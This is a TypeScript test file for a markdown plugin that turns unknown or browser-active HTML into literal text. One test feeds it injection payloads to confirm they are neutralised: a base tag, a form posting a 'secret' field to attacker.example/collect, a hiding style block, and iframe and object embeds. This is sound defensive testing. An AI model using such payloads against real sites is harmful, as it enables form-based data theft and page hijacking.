import assert from 'node:assert/strict';
import test from 'node:test';
import type { Root as HastRoot } from 'hast';
import type { Root as MdastRoot } from 'mdast';
import rehypeRaw from 'rehype-raw';
import remarkParse from 'remark-parse';
import remarkRehype from 'remark-rehype';
import { unified } from 'unified';
import { visit } from 'unist-util-visit';
import {
  isPassiveMarkdownImageSource,
  remarkLiteralUnknownHtml,
} from './remarkLiteralUnknownHtml.ts';

function transformed(markdown: string): MdastRoot {
  const processor = unified().use(remarkParse).use(remarkLiteralUnknownHtml);
  return processor.runSync(processor.parse(markdown)) as MdastRoot;
}

function rendered(markdown: string): HastRoot {
  const processor = unified()
    .use(remarkParse)
    .use(remarkLiteralUnknownHtml)
    .use(remarkRehype, { allowDangerousHtml: true })
    .use(rehypeRaw);
  return processor.runSync(processor.parse(markdown)) as HastRoot;
}

test('unknown placeholder tags become literal text', () => {
  const tree = rendered(
    'Use <files>, <reviewer>name</reviewer>, and <yyyyMMddhhmm>.',
  );
  const elements: string[] = [];
  const text: string[] = [];
  visit(tree, (node) => {
    if (node.type === 'element') elements.push(node.tagName);
    if (node.type === 'text') text.push(node.value);
  });

  assert.doesNotMatch(elements.join(','), /files|reviewer|yyyyMMddhhmm/i);
  assert.match(text.join(''), /<files>/);
  assert.match(text.join(''), /<reviewer>/);
  assert.match(text.join(''), /<\/reviewer>/);
  assert.match(text.join(''), /<yyyyMMddhhmm>/);
});

test('standard HTML and supported custom tags stay raw HTML', () => {
  const tree = rendered('<span class="modal-overlay">ok</span><br><color data-x="1">red</color>');
  const elements: string[] = [];
  const properties: Array<Record<string, unknown> | undefined> = [];
  visit(tree, 'element', (node) => {
    elements.push(node.tagName);
    properties.push(node.properties);
  });

  assert.deepEqual(elements, ['p', 'span', 'br', 'color']);
  assert.deepEqual(properties, [{}, {}, {}, {}]);
});

test('browser-active raw HTML is literal and cannot retain navigation attributes', () => {
  const tree = rendered(
    '<base href="https://attacker.example/"><style>body{display:none}</style>' +
    '<form action="https://attacker.example/collect"><input name="secret"></form>' +
    '<iframe src="/models-cache.json"></iframe><object data="https://attacker.example/x">x</object>',
  );
  const elements: string[] = [];
  const text: string[] = [];
  visit(tree, (node) => {
    if (node.type === 'element') elements.push(node.tagName);
    if (node.type === 'text') text.push(node.value);
  });

  assert.deepEqual(elements, []);
  assert.match(text.join(''), /<base href="https:\/\/attacker\.example\/">/);
  assert.match(text.join(''), /<iframe src="\/models-cache\.json"><\/iframe>/);
  assert.match(text.join(''), /<object data="https:\/\/attacker\.example\/x">x<\/object>/);
});

test('only passive image sources can render directly', () => {
  assert.equal(isPassiveMarkdownImageSource('https://example.test/probe.png'), false);
  assert.equal(isPassiveMarkdownImageSource('https://127.0.0.1/probe.png'), false);
  assert.equal(isPassiveMarkdownImageSource('//example.test/probe.png'), false);
  assert.equal(isPassiveMarkdownImageSource('/icons/favicon.png'), false);
  assert.equal(isPassiveMarkdownImageSource('data:image/svg+xml,<svg/>'), false);
  assert.equal(isPassiveMarkdownImageSource('data:image/png;base64,AA=='), true);
  assert.equal(isPassiveMarkdownImageSource('blob:https://app.local/id'), true);
});

test('unknown tags nested inside valid HTML remain literal', () => {
  const tree = rendered('<div><reviewer>x</reviewer></div>');
  const elements: string[] = [];
  const text: string[] = [];
  visit(tree, (node) => {
    if (node.type === 'element') elements.push(node.tagName);
    if (node.type === 'text') text.push(node.value);
  });

  assert.deepEqual(elements, ['div']);
  assert.equal(text.join(''), '<reviewer>x</reviewer>');
});

test('unknown tags inside inline and fenced code are untouched', () => {
  const source = '`<files>`\n\n```xml\n<reviewer>\n```';
  const tree = transformed(source);
  const codeValues: string[] = [];
  visit(tree, (node) => {
    if (node.type === 'inlineCode' || node.type === 'code') {
      codeValues.push(node.value);
    }
  });

  assert.deepEqual(codeValues, ['<files>', '<reviewer>']);
});
